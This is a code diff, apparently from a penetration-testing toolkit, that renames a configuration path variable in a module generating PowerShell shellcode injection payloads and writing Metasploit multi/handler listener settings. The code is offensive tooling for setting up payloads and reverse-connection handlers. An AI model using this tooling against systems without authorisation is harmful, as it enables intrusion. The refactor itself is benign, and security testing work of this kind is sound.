@@ -26,7 +26,7 @@ auto_migrate = check_config("AUTO_MIGRATE=")
 pyinjection = check_options("PYINJECTION=")
 if pyinjection == "ON":
     # check to ensure that the payload options were specified right
-    if os.path.isfile(setdir + "/payload_options.shellcode"):
+    if os.path.isfile(userconfigpath + "payload_options.shellcode"):
         pyinjection = "on"
         print_status(
             "Multi/Pyinjection was specified. Overriding config options.")
@@ -56,7 +56,7 @@ if validate_ip(ipaddr) == False:
 
 # prompt what port to listen on for powershell then make an append to the current
 # metasploit answer file
-if os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
+if os.path.isfile("%s/meta_config_multipyinjector" % (userconfigpath)):
     # if we have multi injection on, don't worry about these
     if multi_injection != "on":
         if pyinjection == "off":
@@ -66,12 +66,12 @@ if os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
                 ["4"], "Enter the port for Metasploit to listen on for powershell [443]"))
             if port == "":
                 port = "443"
-            fileopen = open("%s/meta_config_multipyinjector" % (setdir), "r")
+            fileopen = open("%s/meta_config_multipyinjector" % (userconfigpath), "r")
             data = fileopen.read()
             match = re.search(port, data)
             if not match:
                 filewrite = open(
-                    "%s/meta_config_multipyinjector" % (setdir), "a")
+                    "%s/meta_config_multipyinjector" % (userconfigpath), "a")
                 filewrite.write("\nuse exploit/multi/handler\n")
                 if auto_migrate == "ON":
                     filewrite.write(
@@ -84,7 +84,7 @@ if os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
 if multi_injection != "on":
     if pyinjection == "off":
         # check to see if the meta config multi pyinjector is there
-        if not os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
+        if not os.path.isfile("%s/meta_config_multipyinjector" % (userconfigpath)):
             if check_options("PORT=") != 0:
                 port = check_options("PORT=")
             # if port.options isnt there then prompt
@@ -128,12 +128,12 @@ if multi_injection == "on":
                 generate_powershell_alphanumeric_payload(
                     powershell_inject_x86, ipaddr, ports, x86)
 
-            if os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
+            if os.path.isfile("%s/meta_config_multipyinjector" % (userconfigpath)):
                 port_check = check_ports(
-                    "%s/meta_config_multipyinjector" % (setdir), ports)
+                    "%s/meta_config_multipyinjector" % (userconfigpath), ports)
                 if port_check == False:
                     filewrite = open(
-                        "%s/meta_config_multipyinjector" % (setdir), "a")
+                        "%s/meta_config_multipyinjector" % (userconfigpath), "a")
                     filewrite.write("\nuse exploit/multi/handler\n")
                     if auto_migrate == "ON":
                         filewrite.write(
@@ -143,15 +143,15 @@ if multi_injection == "on":
                     filewrite.close()
 
             # if we aren't using multi pyinjector
-            if not os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
+            if not os.path.isfile("%s/meta_config_multipyinjector" % (userconfigpath)):
                 # if meta config isn't created yet then create it
-                if not os.path.isfile("%s/meta_config" % (setdir)):
-                    filewrite = open("%s/meta_config" % (setdir), "w")
+                if not os.path.isfile("%s/meta_config" % (userconfigpath)):
+                    filewrite = open("%s/meta_config" % (userconfigpath), "w")
                     filewrite.write("")
                     filewrite.close()
-                port_check = check_ports("%s/meta_config" % (setdir), ports)
+                port_check = check_ports("%s/meta_config" % (userconfigpath), ports)
                 if port_check == False:
-                    filewrite = open("%s/meta_config" % (setdir), "a")
+                    filewrite = open("%s/meta_config" % (userconfigpath), "a")
                     filewrite.write("\nuse exploit/multi/handler\n")
                     if auto_migrate == "ON":
                         filewrite.write(
@@ -164,7 +164,7 @@ if multi_injection == "on":
 if pyinjection == "on":
     multi_injection_x86 = ""
     # read in the file we need for parsing
-    fileopen = open(setdir + "/payload_options.shellcode", "r")
+    fileopen = open(userconfigpath + "payload_options.shellcode", "r")
     payloads = fileopen.read()[:-1].rstrip()  # strips an extra ,
     payloads = payloads.split(",")
     # format: payload<space>port
@@ -196,7 +196,7 @@ if verbose.lower() == "on":
     time.sleep(3)
     print(x86)
 
-filewrite = open("%s/x86.powershell" % (setdir), "w")
+filewrite = open("%s/x86.powershell" % (userconfigpath), "w")
 filewrite.write(x86)
 filewrite.close()
 print_status("Finished generating powershell injection bypass.")
